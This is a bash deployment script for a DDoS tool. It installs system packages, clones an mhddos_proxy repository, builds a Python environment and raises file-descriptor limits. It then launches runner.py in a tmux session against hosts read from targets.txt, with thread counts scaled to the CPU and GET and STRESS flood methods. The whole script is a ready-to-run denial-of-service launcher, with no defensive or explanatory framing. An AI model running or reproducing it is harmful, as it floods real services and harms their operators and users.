#!/usr/bin/env bash

# Debug
# set -x

# Config
basedir=$(readlink -f $(dirname "$BASH_SOURCE"))
targets=$(cat ${basedir}/targets.txt | grep -v ^\# | grep -xv '' | xargs)
apt_req=(
  python3-virtualenv
  git
  vim
  htop
  iotop
  nload
  cpulimit
  nmap
  telnet
  tmux
  tree
  iftop
  nethogs
  netcat-openbsd
  httping
)
src_repo="https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git"
src_dir="${basedir}/src"
tmux_session_name="proxy"
cpu_cores=$(nproc)
mhddos_params="-t $((${cpu_cores} * 1000)) -p 1200 --rpc 2000 --http-methods GET STRESS --debug --table"

# Tuning
ulimit -n 1048576

# Install system dependencies
apt_req_real=()
for i in ${apt_req[@]}; do
  if ! dpkg-query -l $i > /dev/null; then
    apt_req_real+=("$i")
  fi
done
if [[ ! ${#apt_req_real[@]} == 0 ]]; then
  sudo apt update
  sudo apt install -Vy ${apt_req_real[@]}
fi

# Clone MHDDoS sources
if [[ ! -d ${src_dir} ]]; then
  git clone ${src_repo} ${src_dir}
fi

# Create virtualenv for mhddos and install python requirements
if [[ ! -d ${src_dir}/env ]]; then
  virtualenv -p /usr/bin/python3 ${src_dir}/env
  ${src_dir}/env/bin/pip install -r ${src_dir}/requirements.txt
fi

# Start and configure tmux session
tmux start-server
while tmux has-session -t ${tmux_session_name} 2> /dev/null; do
  tmux kill-session -t ${tmux_session_name}
  sleep 1
done
tmux new-session -d -s ${tmux_session_name} -n Monitoring "htop"
tmux set -t ${tmux_session_name} -g pane-border-status top
tmux set -t ${tmux_session_name} -g pane-border-format \
  "#{pane_index} #{pane_current_command}"
tmux set -t ${tmux_session_name} mouse
tmux split-window -t ${tmux_session_name}:0 "nload"

# Start targets
command="cd ${src_dir} && ./env/bin/python runner.py ${targets} ${mhddos_params}"
tmux split-window -t ${tmux_session_name}:0 "${command}"
tmux select-layout -t ${tmux_session_name}:0 tiled
